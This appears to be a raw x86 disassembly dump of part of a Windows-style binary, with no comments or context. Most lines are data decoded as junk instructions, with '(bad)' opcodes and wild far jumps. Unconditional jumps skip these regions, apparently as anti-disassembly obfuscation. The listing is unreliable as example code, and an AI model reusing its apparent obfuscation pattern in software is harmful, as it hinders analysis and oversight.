  407aa9:	xor    DWORD PTR [edx-0x18],0x36
  407aad:	inc    edx
  407aae:	add    BYTE PTR ds:[ecx+0xf121460],ah
  407ab5:	sbb    al,0xab
  407ab7:	mov    bh,0x9e
  407ab9:	(bad)  
  407aba:	push   0x3094195e
  407abf:	add    BYTE PTR [edi-0x47],dl
  407ac2:	movhps xmm0,QWORD PTR [edx+0xea37f1b]
  407ac9:	xor    eax,0x8491035a
  407ace:	dec    eax
  407acf:	in     eax,0xa0
  407ad1:	mov    DWORD PTR [ecx],0xe219dea1
  407ad7:	adc    BYTE PTR [ebp+0x2e],0x8d
  407adb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407adc:	test   al,0x5a
  407ade:	loop   0x407b23
  407ae0:	pop    ds
  407ae1:	lahf   
  407ae2:	add    BYTE PTR [edx-0x38],0xb5
  407ae6:	adc    DWORD PTR [eax+0x5d3d1b93],esp
  407aec:	sub    esi,DWORD PTR [ecx]
  407aee:	xor    BYTE PTR [ecx],bl
  407af0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407af1:	(bad)  
  407af2:	sub    eax,0xa8d6dfe8
  407af7:	iret   
  407af8:	add    edx,DWORD PTR [edx-0x1b]
  407afb:	mov    DWORD PTR [ecx+0x2d2c9bdd],esi
  407b01:	add    al,0xd3
  407b03:	sub    edx,0x3034dbec
  407b09:	cmp    eax,0xbc5bafca
  407b0e:	sar    DWORD PTR [ecx-0x3d3475d1],0xf5
  407b15:	xor    eax,esi
  407b17:	add    eax,edi
  407b19:	push   eax
  407b1a:	mov    eax,DWORD PTR [ebp-0x10]
  407b1d:	add    eax,0xaa
  407b22:	push   eax
  407b23:	mov    eax,DWORD PTR [ebp-0x10]
  407b26:	mov    eax,DWORD PTR [eax+0x198]
  407b2c:	push   DWORD PTR [eax]
  407b2e:	jmp    0x407e7b
  407b33:	sahf   
  407b34:	das    
  407b35:	or     ah,BYTE PTR [edi]
  407b37:	mov    DWORD PTR [ecx],esp
  407b39:	mov    cl,0xb5
  407b3b:	pop    es
  407b3c:	mov    BYTE PTR [ebx],bl
  407b3e:	(bad)  
  407b3f:	popa   
  407b40:	(bad)  
  407b41:	xchg   esp,eax
  407b42:	mov    edx,0x7070c957
  407b47:	and    BYTE PTR [ebp+0x70],bh
  407b4a:	jo     0x407ba9
  407b4c:	fsubp  st(2),st
  407b4e:	mov    edi,0x16e14c8c
  407b53:	loope  0x407b64
  407b55:	inc    eax
  407b56:	add    ah,dl
  407b58:	pop    ebx
  407b59:	or     ah,ch
  407b5b:	xchg   ebp,eax
  407b5c:	jle    0x407b90
  407b5e:	imul   ebp,DWORD PTR [ecx],0x57
  407b61:	inc    esi
  407b62:	cmp    BYTE PTR [esi-0x71],dh
  407b65:	and    BYTE PTR [edi-0x574bf50d],bh
  407b6b:	mov    dl,0xc7
  407b6d:	sbb    ah,bh
  407b6f:	pop    eax
  407b70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b71:	cmp    eax,0x8951d36d
  407b76:	cmp    esi,esp
  407b78:	mov    edx,0xe8be6fcf
  407b7d:	retf   0xc59b
  407b80:	mov    esp,edx
  407b82:	dec    eax
  407b83:	repnz iret 
  407b85:	pop    edi
  407b86:	push   edi
  407b87:	adc    al,ah
  407b89:	mov    eax,ds:0x4f88cd86
  407b8e:	ss es xchg ebx,eax
  407b91:	push   eax
  407b92:	xchg   esp,eax
  407b93:	adc    al,0xc4
  407b95:	inc    esi
  407b96:	cmc    
  407b97:	sub    eax,0x346b9394
  407b9c:	adc    dh,BYTE PTR [esi]
  407b9e:	mov    ecx,0x6470416c
  407ba3:	(bad)  
  407ba4:	xchg   esp,eax
  407ba5:	inc    ebx
  407ba6:	pop    ds
  407ba7:	and    BYTE PTR [ebx+0x12],ah
  407baa:	mov    eax,ds:0x483f550a
  407baf:	inc    ebx
  407bb0:	jnp    0x407c30
  407bb2:	push   ebp
  407bb3:	pop    esi
  407bb4:	mov    fs,WORD PTR [edi+eiz*4+0x5e]
  407bb8:	sbb    eax,0xbb4ddd74
  407bbd:	call   0xffb4:0x6a591347
  407bc4:	push   esp
  407bc5:	jmp    0x89f2:0xd851df43
  407bcc:	push   edx
  407bcd:	loopne 0x407b9a
  407bcf:	xlat   BYTE PTR ds:[ebx]
  407bd0:	enter  0x86b,0x41
  407bd4:	sbb    al,0x1c
  407bd6:	jo     0x407be7
  407bd8:	push   ebx
  407bd9:	jg     0x407c56
  407bdb:	sbb    eax,0xfe929f2d
  407be0:	dec    eax
  407be1:	push   edi
  407be2:	nop
  407be3:	jle    0x407bce
  407be5:	seto   BYTE PTR [edx]
  407be8:	add    al,0xc6
  407bea:	(bad)  
  407beb:	adc    eax,0xc1637e49
  407bf0:	push   esi
  407bf1:	jns    0x407c0d
  407bf3:	out    dx,eax
  407bf4:	xchg   esp,eax
  407bf5:	sti    
  407bf6:	pop    edi
  407bf7:	and    ecx,edi
  407bf9:	cmp    BYTE PTR [esp+ebx*2+0x806f282],0xa9
  407c01:	xchg   esp,eax
  407c02:	mov    WORD PTR [edx-0x4f],ss
  407c05:	cmp    al,0xc4
  407c07:	sbb    eax,0x250bc0ed
  407c0c:	repnz test DWORD PTR [eax-0x7eea2cdb],0xbbccb169
  407c17:	jge    0x407c3c
  407c19:	mov    ebp,DWORD PTR [esi]
  407c1b:	bound  ebx,QWORD PTR [ecx-0x66]
  407c1e:	jecxz  0x407c12
  407c20:	pop    esi
  407c21:	pop    ebx
  407c22:	mov    ah,0xf2
  407c24:	jge    0x407c89
  407c26:	mov    esi,0x57e0ce93
  407c2b:	mov    ds:0xa39084c0,eax
  407c30:	test   BYTE PTR [ecx+0x4f],ch
  407c33:	mov    cs,WORD PTR ds:0xe3f093b7
  407c39:	fldcw  WORD PTR [eax+0x6c]
  407c3c:	mov    DWORD PTR [ebp+0x3c],edi
  407c3f:	call   0xe076:0x3258bcc7
  407c46:	xchg   DWORD PTR [eax-0x67],esi
  407c49:	jns    0x407c07
  407c4b:	sub    al,0xbd
  407c4d:	std    
  407c4e:	mov    edx,0x43dec83b
  407c53:	cwde   
  407c54:	xchg   esi,eax
  407c55:	xchg   bl,dh
  407c57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c58:	sbb    ebx,DWORD PTR [ecx+eiz*1-0x417d008e]
  407c5f:	jg     0x407bfd
  407c61:	dec    eax
  407c62:	scas   al,BYTE PTR es:[edi]
  407c63:	pop    ebx
  407c64:	pop    eax
  407c65:	das    
  407c66:	retf   
  407c67:	jne    0x407c2c
  407c69:	daa    
  407c6a:	jns    0x407c96
  407c6c:	mov    bh,0x62
  407c6e:	fdivp  st(4),st
  407c70:	dec    esi
  407c71:	icebp  
  407c72:	jecxz  0x407cc3
  407c74:	mov    bl,0xf0
  407c76:	stos   DWORD PTR es:[edi],eax
  407c77:	aaa    
  407c78:	fst    DWORD PTR [edx+0x5838ffc5]
  407c7e:	adc    ecx,DWORD PTR [ebp+0x2bbb2885]
  407c84:	jnp    0x407c4e
  407c86:	call   0x3b055ba3
  407c8b:	jle    0x407c74
  407c8d:	in     al,0x88
  407c8f:	fwait
  407c90:	jmp    0x407c8f
  407c92:	or     DWORD PTR [ebx],esp
  407c94:	sti    
  407c95:	push   esp
  407c96:	add    DWORD PTR [eax+0x1],eax
  407c99:	data16 test al,0xa8
  407c9c:	jbe    0x407cc2
  407c9e:	ds inc edi
  407ca0:	loopne 0x407ce2
  407ca2:	das    
  407ca3:	call   0x4e475cb8
  407ca8:	mov    bh,0x3a
  407caa:	xchg   edx,eax
  407cab:	xchg   BYTE PTR [ecx+0x34392da8],cl
  407cb1:	mov    al,ds:0xde37f019
  407cb6:	test   al,0x9d
  407cb8:	xor    DWORD PTR [edi-0x1e],edi
  407cbb:	(bad)  
  407cbc:	or     eax,0xe348713d
  407cc1:	ins    DWORD PTR es:[edi],dx
  407cc2:	mov    edi,0x692b00fb
  407cc7:	jae    0x407d24
  407cc9:	in     eax,dx
  407cca:	pushf  
  407ccb:	leave  
  407ccc:	jmp    0xbb12:0x5b23a512
  407cd3:	mov    dh,BYTE PTR [esi+0x75013af6]
  407cd9:	mov    ds:0x24096d6a,eax
  407cde:	aaa    
  407cdf:	int3   
  407ce0:	dec    edi
  407ce1:	push   edx
  407ce2:	jne    0x407cda
  407ce4:	rol    BYTE PTR [ebp+0x6c],0xdb
  407ce8:	shl    BYTE PTR [ecx-0x73],0x22
  407cec:	mov    edx,0xb9cb4f40
  407cf1:	mov    WORD PTR [edi-0x44],ds
  407cf4:	dec    edx
  407cf5:	mov    edx,0x581e9a8a
  407cfa:	das    
  407cfb:	push   ebp
  407cfc:	pop    ss
  407cfd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407cfe:	in     al,dx
  407cff:	les    eax,FWORD PTR ds:0x70cfc265
  407d05:	jecxz  0x407c96
  407d07:	bnd jg 0x407ca1
  407d0a:	jle    0x85f40a30
  407d10:	cmp    eax,0x73988ea5
  407d15:	mov    ch,0x4e
  407d17:	sub    BYTE PTR [esi],dh
  407d19:	in     al,dx
  407d1a:	rol    cl,1
  407d1c:	(bad)  
  407d1d:	fstp   QWORD PTR [edi-0x50]
  407d20:	clc    
  407d21:	inc    ecx
  407d22:	adc    eax,0xdb911b58
  407d27:	xor    cl,bh
  407d29:	mov    eax,ds:0x4f1b3b50
  407d2e:	cmp    BYTE PTR [ebx-0x54],cl
  407d31:	mov    cl,0x13
  407d33:	sti    
  407d34:	xchg   esi,eax
  407d35:	lock ret 
  407d37:	out    0xfa,eax
  407d39:	jnp    0x407cbe
  407d3b:	mov    ah,0xef
  407d3d:	jnp    0x407d85
  407d3f:	ret    0x14b3
  407d42:	mov    ch,0xf5
  407d44:	js     0x407db7
  407d46:	adc    ebp,DWORD PTR [ecx+0x3fc509b6]
  407d4c:	inc    ecx
  407d4d:	out    dx,al
  407d4e:	sar    eax,cl
  407d50:	daa    
  407d51:	xor    ch,dh
  407d53:	jb     0x407d98
  407d55:	or     BYTE PTR [eax-0x56],al
  407d58:	xchg   esp,eax
  407d59:	xchg   edi,eax
  407d5a:	push   edx
  407d5b:	mov    edx,0xca7b0d64
  407d60:	xlat   BYTE PTR ds:[ebx]
  407d61:	push   edi
  407d62:	(bad)  
  407d63:	xor    al,0xc3
  407d65:	dec    edi
  407d66:	jbe    0x407d89
  407d68:	xor    al,0x2
  407d6a:	sbb    dh,ch
  407d6c:	pop    edi
  407d6d:	call   0xc336ceee
  407d72:	sbb    ah,BYTE PTR [edi+0x73]
  407d75:	into   
  407d76:	push   ebx
  407d77:	dec    edx
  407d78:	xor    DWORD PTR [ebp+ecx*4-0x48],ebp
  407d7c:	(bad)  
  407d7d:	xchg   esp,eax
  407d7e:	sar    DWORD PTR [edi-0x37],1
  407d81:	pop    edx
  407d82:	cmp    ebx,DWORD PTR [ebp+0x6a75bdf4]
  407d88:	pop    edx
  407d89:	xor    al,0xaf
  407d8b:	ret    
  407d8c:	(bad)  
  407d8d:	popf   
  407d8e:	xchg   ebx,eax
  407d8f:	ret    
  407d90:	pop    ds
  407d91:	ins    BYTE PTR es:[edi],dx
  407d92:	inc    DWORD PTR [si-0x70]
  407d96:	popa   
  407d97:	jbe    0x407d35
  407d99:	adc    cl,BYTE PTR ds:0x69bdb8c2
  407d9f:	cdq    
  407da0:	movsx  edx,al
  407da3:	fidivr WORD PTR [edi+0x46]
  407da6:	rcr    BYTE PTR [ebx-0x6ce6350],0xe7
  407dad:	add    eax,0x2cd1d40a
  407db2:	mov    DWORD PTR [ebp-0x2],ecx
  407db5:	and    eax,0xa6d195b5
  407dba:	out    dx,eax
  407dbb:	dec    ecx
  407dbc:	mov    edi,0x88aa38f7
  407dc1:	dec    esi
  407dc2:	sub    DWORD PTR [ebx+0x241b1dc1],ecx
  407dc8:	xchg   ebp,eax
  407dc9:	push   ss
  407dca:	xor    edi,DWORD PTR [esi]
  407dcc:	ja     0x407d78
  407dce:	sbb    DWORD PTR [ecx],eax
  407dd0:	mov    ds:0xd3e59c13,al
  407dd5:	loope  0x407dd8
  407dd7:	mov    ds:0x625d1f4b,eax
  407ddc:	mov    cl,BYTE PTR [ecx+0x4a]
  407ddf:	aaa    
  407de0:	pop    esp
  407de2:	sti    
  407de3:	inc    esp
  407de4:	cld    
  407de5:	in     al,0x41
  407de7:	dec    ebp
  407de8:	inc    esp
  407de9:	inc    ebx
  407dea:	stc    
  407deb:	mov    al,0x80
  407ded:	jecxz  0x407e68
  407def:	mov    WORD PTR [esp+ebx*8+0x5f57c19f],gs
  407df6:	repnz fcom DWORD PTR [eax]
  407df9:	cdq    
  407dfa:	mov    dh,0xd6
  407dfc:	test   BYTE PTR [eax+0x4bcd0562],0xd4
  407e03:	repnz aad 0x8d
  407e06:	repnz fidivr WORD PTR [ecx]
  407e09:	cs mov es:0x30a76409,eax
  407e10:	jo     0x407dd3
  407e12:	adc    cl,BYTE PTR [esi]
  407e14:	test   BYTE PTR [ebx+0x1ac0119f],0xd9
  407e1b:	adc    dh,BYTE PTR [eax-0xc]
  407e1e:	cli    
  407e1f:	xchg   ebp,eax
  407e20:	adc    esp,DWORD PTR cs:0x40a8d1d2
  407e27:	sub    DWORD PTR [edi-0x37],ebp
  407e2a:	mov    ch,0xf6
  407e2c:	out    0xc1,al
  407e2e:	jl     0x407ea7
  407e30:	shl    DWORD PTR [ecx+esi*8-0x2f],cl
  407e34:	sub    edx,DWORD PTR [ebx]
  407e36:	aaa    
  407e37:	add    esp,esp
  407e39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e3a:	jnp    0x407e18
  407e3c:	pushf  
  407e3d:	xchg   dh,bh
  407e3f:	xchg   esi,eax
  407e40:	(bad)  
  407e41:	mov    edx,0x5581798f
  407e46:	xchg   BYTE PTR [eax+0x77],dl
  407e49:	aad    0x39
  407e4b:	sti    
  407e4c:	mov    edi,esp
  407e4e:	test   al,0xe
  407e50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e51:	jbe    0x407ec4
  407e53:	sub    al,0x83
  407e55:	push   ds
  407e56:	leave  
  407e57:	fistp  DWORD PTR [edx+0x57]
  407e5a:	fisttp DWORD PTR ds:0x93605f3f
  407e60:	jl     0x407e12
  407e62:	add    al,BYTE PTR [ebp+eax*1+0x28914b0f]
  407e69:	sub    DWORD PTR [edi-0x42],esp
  407e6c:	bound  edi,QWORD PTR [ecx+0x3cb1878]
  407e72:	fimul  DWORD PTR [eax-0x6d]
  407e75:	cdq    
  407e76:	stc    
  407e77:	pop    ds
  407e78:	add    cl,ch
  407e7a:	push   esp
  407e7b:	call   0x4120bb
  407e80:	mov    DWORD PTR [ebp-0x8],eax
  407e83:	cmp    DWORD PTR [ebp-0x8],0x0
  407e87:	jmp    0x4081d4
  407e8c:	in     eax,0xe6
  407e8e:	outs   dx,DWORD PTR ds:[esi]
  407e8f:	pop    ebp
  407e90:	outs   dx,DWORD PTR ds:[esi]
  407e91:	jne    0x407e88
  407e93:	data16 hlt 
  407e95:	test   ebx,eax
  407e97:	pushf  
  407e98:	mov    ch,0xc6
  407e9a:	sbb    cl,ah
  407e9c:	pop    es
  407e9d:	aad    0x70
  407e9f:	jo     0x407ec1
  407ea1:	jge    0x407f13
  407ea3:	jo     0x407eaa
  407ea5:	(bad)  
  407ea7:	jg     0x407e31
  407ea9:	daa    
  407eaa:	sbb    esi,DWORD PTR [ecx]
  407eac:	sbb    dh,BYTE PTR [edx+0x63f3e18e]
  407eb2:	dec    ecx
  407eb3:	es dec ecx
  407eb5:	imul   eax,DWORD PTR [ecx+0x35cacf06],0x91d863cd
  407ebf:	cmp    al,0x91
  407ec1:	into   
  407ec2:	loop   0x407eef
  407ec4:	mul    DWORD PTR [edi+0x2e0b453d]
  407eca:	xor    bh,BYTE PTR ds:0x6ef786d6
  407ed0:	dec    esp
  407ed1:	in     al,dx
  407ed2:	cmp    esi,DWORD PTR [esi+0xca155df]
  407ed8:	push   0x24
  407eda:	sub    DWORD PTR [edx+0x6a],ecx
  407edd:	icebp  
  407ede:	mov    ch,bh
  407ee0:	mov    esi,DWORD PTR [ebx]
  407ee2:	jns    0x407f62
  407ee4:	xchg   ebp,eax
  407ee5:	(bad)  
  407ee6:	push   ss
  407ee7:	dec    esp
  407ee8:	leave  
  407ee9:	ret    0xfcd5
  407eec:	inc    bh
  407eee:	push   ds
  407eef:	dec    esp
  407ef0:	inc    ebp
  407ef1:	fdivr  DWORD PTR [esi+0x7d3684ea]
  407ef7:	pop    esp
  407ef8:	inc    edi
  407ef9:	mov    edi,0xcc485d65
  407efe:	xor    cl,dl
  407f00:	fwait
  407f01:	cmp    edx,DWORD PTR [esi]
  407f03:	fsubr  DWORD PTR [edx]
  407f05:	ja     0x407e8f
  407f07:	popf   
  407f08:	outs   dx,BYTE PTR ds:[esi]
  407f09:	jecxz  0x407e8c
  407f0b:	mov    edx,0x94471285
  407f10:	mov    esp,ebx
  407f12:	push   ebx
  407f13:	mov    ebp,0x6d7d4617
  407f18:	call   0x6013:0x9d341429
  407f1f:	mov    edx,0x3bb3f7ab
  407f24:	xchg   edx,eax
  407f25:	lods   eax,DWORD PTR ds:[esi]
  407f26:	fwait
  407f27:	push   0xffffff99
  407f29:	(bad)  
  407f2b:	mov    BYTE PTR [ebp+0x1f],dl
  407f2e:	and    al,0xf9
  407f30:	imul   edx,DWORD PTR [ebx],0x2c
  407f33:	cmp    ah,BYTE PTR ds:0xdabd3a66
  407f39:	jns    0x407f11
  407f3b:	inc    edx
  407f3c:	scas   eax,DWORD PTR es:[edi]
  407f3d:	mov    eax,ds:0x9fe6e904
  407f42:	test   al,ch
  407f44:	xor    eax,0x10bd699a
  407f49:	push   ebx
  407f4a:	mov    dh,BYTE PTR [ebp+0x79]
  407f4d:	(bad)  
  407f4e:	sub    bl,BYTE PTR [ecx+0x230e3985]
  407f54:	mov    esp,0x120190f5
  407f59:	sar    BYTE PTR [eax+edx*8],1
  407f5c:	jns    0x407f49
  407f5e:	dec    esp
  407f5f:	push   0xffffff98
  407f61:	stc    
  407f62:	mov    ebx,DWORD PTR es:[ecx]
  407f65:	add    BYTE PTR [eax-0x31],0x65
  407f69:	mov    ah,BYTE PTR [edx+0xfa88fa4]
  407f6f:	jmp    0xedf8:0x19db767a
  407f76:	cmp    ecx,DWORD PTR [ecx+0x4485bbd0]
  407f7c:	mov    eax,0x289a9b4c
  407f81:	push   0x7dec6518
  407f86:	cdq    
  407f87:	(bad)  
  407f89:	daa    
  407f8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f8b:	dec    edx
  407f8c:	or     al,0xc6
  407f8e:	adc    cl,cl
  407f90:	pop    ds
  407f91:	and    ax,0x3837
  407f95:	out    dx,al
  407f96:	shr    DWORD PTR ds:0x3df2e72f,0xbd
  407f9d:	js     0x407f2e
  407f9f:	scas   al,BYTE PTR es:[edi]
  407fa0:	es aaa 
  407fa2:	sar    bh,1
  407fa4:	push   ebx
  407fa5:	mov    eax,ds:0x88b6eaa
  407faa:	jb     0x407f35
  407fac:	inc    esp
  407fad:	imul   ebx,ebp,0xffffff94
  407fb0:	fisttp DWORD PTR [ebx+0x6868aba]
  407fb6:	sti    
  407fb7:	xor    ax,0x554
  407fbb:	aam    0x57
  407fbd:	cmp    edx,0x77c42870
  407fc3:	mov    gs,WORD PTR [ebx]
  407fc5:	mov    al,0x28
  407fc7:	popa   
  407fc8:	test   DWORD PTR [edx-0x5a27d608],ebx
  407fce:	mov    ch,0xcf
  407fd0:	js     0x408039
  407fd2:	and    DWORD PTR [edx+edi*1+0x671f12b2],ecx
  407fd9:	loope  0x407fe1
  407fdb:	int    0x24
  407fdd:	pop    es
  407fde:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407fdf:	addr16 jg 0x407fa5
  407fe2:	mov    esi,0x64fd437c
  407fe7:	pop    esi
  407fe8:	mov    eax,ds:0xca129322
  407fed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407fee:	sti    
  407fef:	mov    edi,0x3be9e5fb
  407ff4:	test   al,0x52
  407ff6:	xor    BYTE PTR [ebx+0x18128f88],cl
  407ffc:	shl    BYTE PTR [eax-0x27],cl
  407fff:	xor    DWORD PTR [ebp+0x4e],0xffffffaa
  408003:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408004:	mov    al,ds:0xcd9aafbe
  408009:	adc    BYTE PTR [ebp+0x68],ch
  40800c:	cmp    eax,0xf191f7e5
  408011:	cli    
  408012:	lock push esp
  408014:	fwait
  408015:	mov    bl,0xfa
  408017:	add    eax,0x340ac4f6
  40801c:	call   0xd8dd5bd6
  408021:	pop    edi
  408022:	add    BYTE PTR [ecx],cl
  408024:	(bad)  
  408025:	pop    ecx
  408026:	mov    bh,ah
  408028:	mov    ecx,0xc2c1ac62
  40802d:	xor    DWORD PTR [ebx-0x1d],edi
  408030:	dec    edi
  408031:	jle    0x407fc4
  408033:	inc    ebp
  408034:	not    DWORD PTR [ebx+0x7e]
  408037:	(bad)  
  408038:	fldenv ds:0xff13da
  40803e:	mov    esi,ebx
  408040:	bound  ebx,QWORD PTR [ebx-0x18f81e21]
  408046:	sti    
  408047:	add    DWORD PTR [ebp+0x7d2cc771],ebx
  40804d:	mov    ds:0xc5fce492,eax
  408052:	dec    edi
  408053:	dec    ebp
  408054:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408055:	ret    0x8c50
  408058:	out    0xe,eax
  40805a:	sbb    DWORD PTR [edx],ebx
  40805c:	fadd   QWORD PTR [eax+0x52]
  40805f:	xchg   esi,eax
  408060:	ins    BYTE PTR es:[edi],dx
  408061:	xlat   BYTE PTR ds:[ebx]
  408062:	aam    0x13
  408064:	dec    ecx
  408065:	inc    ebp
  408066:	popf   
  408067:	mov    ecx,0x4f80577c
  40806c:	js     0x4080bb
  40806e:	push   ds
  40806f:	pop    esi
  408070:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408071:	retf   
  408072:	mov    al,0x4b
  408074:	sbb    al,0xab
  408076:	dec    eax
  408077:	mov    edx,0xb2ee413c
  40807c:	inc    eax
  40807d:	jae    0x408036
  40807f:	inc    esp
  408080:	cwde   
  408081:	jns    0x408076
  408083:	loopne 0x408101
  408085:	call   0xc31cc9aa
  40808a:	or     esi,DWORD PTR [eax]
  40808c:	inc    esi
  40808d:	push   eax
  40808e:	or     BYTE PTR [ecx+0x5bbb2096],cl
  408094:	adc    BYTE PTR ds:0x63620ae7,ch
  40809a:	and    eax,0x707e7d65
  40809f:	das    
  4080a0:	fistp  QWORD PTR [ebp*4-0x195fc962]
  4080a7:	adc    ebx,DWORD PTR [edi-0x27c27d43]
  4080ad:	loop   0x4080cb
  4080af:	ror    DWORD PTR [eax+0x2053d5fe],0xf2
  4080b6:	pop    edx
  4080b7:	in     eax,dx
  4080b8:	inc    edx
  4080b9:	push   ebx
  4080ba:	stos   BYTE PTR es:[edi],al
  4080bb:	retf   
  4080bc:	sub    eax,0x695f318
  4080c1:	xchg   ecx,eax
  4080c2:	fsubr  DWORD PTR [ebx+0x67]
  4080c5:	push   cs
  4080c6:	sub    eax,DWORD PTR [ecx+0x3620bdcc]
  4080cc:	adc    al,0x71
  4080ce:	pop    edx
  4080cf:	into   
  4080d0:	add    BYTE PTR [edx],ch
  4080d2:	mov    bh,0x2b
  4080d4:	vrangesd xmm2{k4}{z},xmm2,xmm1,{sae},0x83
  4080db:	arpl   WORD PTR ds:0x2e35b92,dx
  4080e1:	fidivr DWORD PTR [eax-0x76250c89]
  4080e7:	loopne 0x4080c4
  4080e9:	pop    edx
  4080ea:	mov    ch,0xcb
  4080ec:	xchg   ebx,eax
  4080ed:	fwait
  4080ee:	lfs    esi,FWORD PTR [esi]
  4080f1:	sbb    esi,edx
  4080f3:	ficom  DWORD PTR [ebx+0x66]
  4080f6:	outs   dx,BYTE PTR ds:[esi]
  4080f7:	imul   eax,DWORD PTR [edi-0xd],0x59
  4080fb:	mov    esp,0xbdc2c0dd
  408100:	xchg   ebp,eax
  408101:	into   
  408102:	retf   
  408103:	mov    dh,0x34
  408105:	or     ah,dl
  408107:	(bad)  
  408108:	push   ss
  408109:	xchg   esp,eax
  40810a:	pop    eax
  40810b:	fwait
  40810c:	mov    al,ds:0x4e3ae430
  408111:	jecxz  0x40811d
  408113:	iret   
  408114:	add    ebp,DWORD PTR [edi-0x1e]
  408117:	sub    BYTE PTR [ebp-0x3d],cl
  40811a:	rcr    DWORD PTR [esi],0xe2
  40811d:	mov    esi,0x4efb45b4
  408122:	sbb    dl,dl
  408124:	inc    edi
  408125:	push   0xffffff88
  408127:	sub    BYTE PTR [ebp+0x51],dh
  40812a:	pop    ecx
  40812b:	adc    al,ah
  40812d:	add    DWORD PTR [ebx-0x14],edx
  408130:	pop    esi
  408131:	jle    0x4080f6
  408133:	pushf  
  408134:	test   DWORD PTR [ecx+edi*2+0x50],eax
  408138:	inc    eax
  408139:	adc    BYTE PTR [ebx+0x4e],cl
  40813c:	arpl   WORD PTR [edi+0x66],sp
  40813f:	and    dl,dh
  408141:	xlat   BYTE PTR ds:[ebx]
  408142:	fs fcomp st(1)
  408145:	test   DWORD PTR [eax-0x1c],ebp
  408148:	adc    al,0xf
  40814a:	inc    edx
  40814b:	dec    edi
  40814c:	mov    es,WORD PTR [ebp+0x60]
  40814f:	jne    0x408107
  408151:	test   bh,0x5b
  408154:	xor    bl,al
  408156:	xchg   ecx,eax
  408157:	test   BYTE PTR [edi+esi*4+0x11540a52],al
  40815e:	jp     0x4080f3
  408160:	int3   
  408161:	add    ebp,esi
  408163:	mov    DWORD PTR [esi],ecx
  408165:	pushf  
  408166:	jae    0x408163
  408168:	(bad)  
  408169:	int    0x2
  40816b:	cwde   
  40816c:	mov    bh,0x6b
  40816e:	repz or al,0x1b
  408171:	ret    
  408172:	(bad)  
  408173:	cdq    
  408174:	fs mov ecx,0xed4e7da6
  40817a:	(bad)  
  40817b:	or     DWORD PTR [ecx+0x19],0xf5c5403c
  408182:	xchg   ecx,eax
  408183:	add    esp,DWORD PTR [eax+eiz*1+0x1fcb05e]
  40818a:	leave  
  40818b:	sahf   
  40818c:	push   0xad49835c
  408191:	jmp    0x40818f
  408193:	mov    edx,0xe81bd7e4
  408198:	add    DWORD PTR [edi],eax
  40819a:	fisub  WORD PTR ds:0x2c3f29f9
  4081a0:	mov    edx,0xce4c6442
  4081a5:	popf   
  4081a6:	scas   al,BYTE PTR es:[edi]
  4081a7:	cmp    esi,DWORD PTR [ebx-0x57]
  4081aa:	(bad)  
  4081ab:	fsubr  DWORD PTR [esp+ebx*1-0x34a6608f]
  4081b2:	(bad)  
  4081b3:	xchg   esp,eax
  4081b4:	(bad)  
  4081b5:	cmc    
  4081b6:	test   al,ah
  4081b8:	jp     0x40816c
  4081ba:	lods   al,BYTE PTR ds:[esi]
  4081bb:	jmp    0xd06d3def
  4081c0:	mov    bl,0x39
  4081c2:	sub    esi,edi
  4081c4:	frstor [eax]
  4081c6:	not    BYTE PTR [eax+0x307b0be4]
  4081cc:	outs   dx,DWORD PTR ds:[esi]
  4081cd:	pop    ecx
  4081ce:	add    ebx,ecx
  4081d0:	inc    ebp
  4081d1:	(bad)  
  4081d2:	repnz mov bh,0x8d
  4081d5:	inc    ebp
  4081d6:	add    al,0x89
  4081d8:	inc    ebp
  4081d9:	loopne 0x4081ea
  4081db:	test   BYTE PTR [esp+edx*1+0x458d0000],cl
  4081e2:	call   0xd4860d37
  4081e7:	xor    eax,esi
  4081e9:	add    eax,edi
  4081eb:	push   eax
  4081ec:	mov    eax,DWORD PTR [ebp-0x1c]
  4081ef:	xor    eax,esi
  4081f1:	add    eax,edi
  4081f3:	push   eax
  4081f4:	push   DWORD PTR [ebp-0x8]
  4081f7:	lea    eax,[ebp-0x78]
  4081fa:	push   eax
  4081fb:	push   DWORD PTR [ebp-0xc]
  4081fe:	push   DWORD PTR [ebp-0x14]
  408201:	call   0x406508
  408206:	test   eax,eax
  408208:	je     0x408233
  40820e:	lea    eax,[ebp-0x78]
  408211:	push   eax
  408212:	mov    eax,DWORD PTR [ebp-0x14]
  408215:	xor    eax,esi
  408217:	add    eax,edi
  408219:	push   eax
  40821a:	mov    eax,DWORD PTR [ebp-0x10]
  40821d:	add    eax,0xee
  408222:	push   eax
  408223:	mov    eax,DWORD PTR [ebp-0x10]
  408226:	mov    eax,DWORD PTR [eax+0x198]
  40822c:	push   DWORD PTR [eax]
  40822e:	call   0x4120bb
  408233:	mov    ecx,DWORD PTR [ebp-0x1c]
  408236:	xor    ecx,esi
  408238:	mov    eax,0xffcd8d64
  40823d:	sub    eax,ecx
  40823f:	sub    eax,DWORD PTR [ebp-0x8]
  408242:	mov    ecx,DWORD PTR [ebp-0x30]
  408245:	add    ecx,eax
  408247:	mov    eax,DWORD PTR [ebp-0x8]
  40824a:	mov    DWORD PTR [eax+0x1],ecx
  40824d:	mov    al,BYTE PTR [ebp-0x1]
  408250:	mov    ecx,DWORD PTR [ebp-0x8]
  408253:	xor    al,0x47
  408255:	sub    al,0x37
  408257:	jmp    0x4085a4
  40825c:	ja     0x408201
  40825e:	mov    ecx,0x7175496f
  408263:	mov    ds:0xd6da6ce9,eax
  408268:	mov    ebx,0x37ba1a5c
  40826d:	shl    BYTE PTR [eax+0x70],cl
  408270:	and    BYTE PTR [ebp+0x70],bh
  408273:	jo     0x40823a
  408275:	mov    dh,0x9e
  408277:	cmp    cl,BYTE PTR [edi]
  408279:	test   BYTE PTR [eax+0x7e],al
  40827c:	cmp    eax,0x5209a644
  408281:	clc    
  408282:	mov    edi,0x46938e54
  408287:	clc    
  408288:	call   0x34e9:0xf1156196
  40828f:	jmp    0x4082cb
